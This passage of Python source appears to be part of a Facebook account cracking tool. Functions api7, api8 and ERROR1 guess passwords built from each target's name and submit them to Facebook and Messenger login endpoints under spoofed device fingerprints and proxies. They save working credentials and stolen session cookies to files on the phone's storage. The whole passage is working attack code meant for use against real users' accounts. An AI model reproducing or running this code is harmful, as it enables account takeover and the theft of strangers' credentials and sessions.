                color = random.choice([P,M,H,K,B,U,O,N])
                sys.stdout.write(f"\r\r\x1b[1;97m[ERROR-XD-M7\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
                sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        inform = random.choice(['X697''X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        network = random.choice(['Zong','null','Banglalink','Roshan','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/250.0.0.11.114;FBBV/28055324;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-P905V;FBSV/11;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        __locale__ = {
                        "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                        "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE", "pt_BR": "BR"
                        }
                        country_locale = random.choice(list(__locale__.keys()))
                        country_code = __locale__[country_locale]
                        pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                        data = {
                        "adid": adid,
                        "format": "json",
                        "device_id": device_id,
                        "email": ids,
                        "password": f"#{pax}:0:{int(time.time())}:{pas}",
                        "session_id": str(uuid.uuid4()),
                        "advertiser_id": str(uuid.uuid4()),
                        "reg_instance": str(uuid.uuid4()),
                        "logged_out_id": str(uuid.uuid4()),
                        "hash_id": str(uuid.uuid4()),
                        "sim_country": "id",
                        "network_country": "id",
                        "enroll_misauth": "false",
                        "generate_analytics_claims": "1",
                        "credentials_type": "password",
                        "source": "login",
                        "error_detail_type": "button_with_disabled",
                        "enroll_misauth": "false",
                        "cpl": "true",
                        "generate_session_cookies": "1",
                        "generate_machine_id": "1",
                        "meta_inf_fbmeta": "",
                        "currently_logged_in_userid": "0",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers = {
                        "Authorization": f"OAuth {accessToken}",
                        "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                        "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                        "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                        "X-FB-Friendly-Name": "authenticate",
                        "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
                        "User-Agent": generate_realistic_ua(),
                        "Accept-Encoding": "gzip, deflate",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "X-FB-HTTP-Engine": "Liger"
                        }
                        url = 'https://api.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ERROR-OK💚] '+ids+' | '+pas)
                                        get_coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        coki = f"sb={compile_coki};{get_coki}"
                                        open('/sdcard/ERROR-ZONE/ERROR-FILE-M7-COOKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/ERROR-ZONE/ERROR-FILE-M7-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        os.system('espeak -a 300 "HEY,  YOU,  GOT,  OK,  ID"')
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m[ERROR-2F💔] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[ERROR-CP💔] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ERROR-ZONE/ERROR-FILE-M7-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ERROR-ZONE/ERROR-FILE-M7-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(5)
                api7(ids,names,passlist)
        except Exception as e:
                pass
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE M8 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def api8(ids,names,passlist):
        try:
                global ok,loop,sim_id
                color = random.choice([P,M,H,K,B,U,O,N])
                sys.stdout.write(f"\r\r\x1b[1;97m[ERROR-XD-M8\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
                sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        inform = random.choice(['X697''X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        network = random.choice(['Zong','null','Banglalink','Roshan','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/250.0.0.11.114;FBBV/28055324;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-P905V;FBSV/11;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        __locale__ = {
                        "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                        "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE", "pt_BR": "BR"
                        }
                        country_locale = random.choice(list(__locale__.keys()))
                        country_code = __locale__[country_locale]
                        pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                        data = {
                        "adid": adid,
                        "format": "json",
                        "device_id": device_id,
                        "email": ids,
                        "password": f"#{pax}:0:{int(time.time())}:{pas}",
                        "session_id": str(uuid.uuid4()),
                        "advertiser_id": str(uuid.uuid4()),
                        "reg_instance": str(uuid.uuid4()),
                        "logged_out_id": str(uuid.uuid4()),
                        "hash_id": str(uuid.uuid4()),
                        "sim_country": "id",
                        "network_country": "id",
                        "enroll_misauth": "false",
                        "generate_analytics_claims": "1",
                        "credentials_type": "password",
                        "source": "login",
                        "error_detail_type": "button_with_disabled",
                        "enroll_misauth": "false",
                        "cpl": "true",
                        "generate_session_cookies": "1",
                        "generate_machine_id": "1",
                        "meta_inf_fbmeta": "",
                        "currently_logged_in_userid": "0",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers = {
                        "Authorization": f"OAuth {accessToken}",
                        "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                        "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                        "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                        "X-FB-Friendly-Name": "authenticate",
                        "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
                        "User-Agent": UAA2(),
                        "Accept-Encoding": "gzip, deflate",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "X-FB-HTTP-Engine": "Liger"
                        }
                        url = 'https://graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ERROR-OK💚] '+ids+' | '+pas)
                                        get_coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        coki = f"sb={compile_coki};{get_coki}"
                                        open('/sdcard/ERROR-ZONE/ERROR-FILE-M8-COOKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/ERROR-ZONE/ERROR-FILE-M8-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        os.system('espeak -a 300 "HEY,  YOU,  GOT,  OK,  ID"')
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m[ERROR-2F💔] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[ERROR-CP💔] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ERROR-ZONE/ERROR-FILE-M8-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ERROR-ZONE/ERROR-FILE-M8-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(5)
                api8(ids,names,passlist)
        except Exception as e:
                pass
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ RANDOM AND GMAIL M1 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def ERROR1(ids,passlist):
	global loop,oks,cps
	color = random.choice([P,M,H,K,B,U,O,N])
	sys.stdout.write(f"\r\r\x1b[1;97m[ERROR-XD-M1\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
	sys.stdout.flush()
	ses = requests.Session()
	while True:
		try:
			ua = random.choice(ugen)
			headers = {
             "Host": "www.messenger.com",
             "Connection": "keep-alive",
             "Content-Length": "267",
             "Cache-Control": "max-age=0",
             "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
             "sec-ch-ua-mobile": "?0",
             "sec-ch-ua-platform": '"Linux"',
             "Upgrade-Insecure-Requests": "1",
             "Origin": "https://www.messenger.com",
             "Content-Type": "application/x-www-form-urlencoded",
             "User-Agent": ua,
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
             "Sec-Fetch-Site": "same-origin",
             "Sec-Fetch-Mode": "navigate",
             "Sec-Fetch-User": "?1",
             "Sec-Fetch-Dest": "document",
             "Referer": "https://www.messenger.com/",
             "Accept-Encoding": "gzip, deflate, br",
             "Accept-Language": "en-GB,en;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5",
			}
			reqs = ses.get("https://www.messenger.com/").text
			datr = re.search('_js_datr","(.*?)",', str(reqs)).group(1)
			data = {
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(reqs)).group(1),
             "lsd":re.search('name="lsd" value="(.*?)"', str(reqs)).group(1),
             "initial_request_id":re.search('name="initial_request_id" value="(.*?)"', str(reqs)).group(1),
             "timezone":"-300",
             "lgndim":re.search('name="lgndim" value="(.*?)"', str(reqs)).group(1),
             "lgnrnd":re.search('name="lgnrnd" value="(.*?)"', str(reqs)).group(1),
             "lgnjs":"n",
             "email":ids,
             "login":"1",
             "default_persistent":""
			}
			headers.update({"Cookie":f"wd=980x1715; dpr=2; _js_datr={datr}"})
			break
		except Exception as e:pass
	for pas in passlist:
		try:
			data.update({"pass":"".join(pas)})
			response = ses.post("https://www.messenger.com/login/password/", data=data, headers=headers, proxies=prox(), allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				coki = ses.cookies.get_dict()
				cok = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=en_US" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + base64.b64encode(os.urandom(30)).decode().replace("=","").replace("+","_").replace("/","-")) + ";" + ("m_page_voice="+coki["c_user"]) + ";ps_n=0;ps_l=0;m_pixel_ratio=2;wd=360x820;"
				uid = re.search('user=(.*?);',str(cok)).group(1)
				if uid in str(oks):
					break
				print('\r\r\033[1;32m[ERROR-OK💚] '+uid+' | '+pas)
				oks.append(uid)
				open('/sdcard/ERROR-ZONE/ERROR-R-OK.txt','a').write(uid+'|'+pas+'\n')
				break
			elif "www.facebook.com%2Fcheckpoint" in str(response.headers.get('Location')):
				try:
					x = str(response.headers)
					ids = re.findall("3A(.*?)%2",str(x))[1]
				except:
					ids = ids
				open('/sdcard/ERROR-ZONE/ERROR-R-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:continue
		except (requests.exceptions.ConnectionError):
			time.sleep(5)
			ERROR1(ids,passlist)
		except Exception as e:pass
	loop+=1
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ AUTO CREATE ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ END ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
approval()
menu()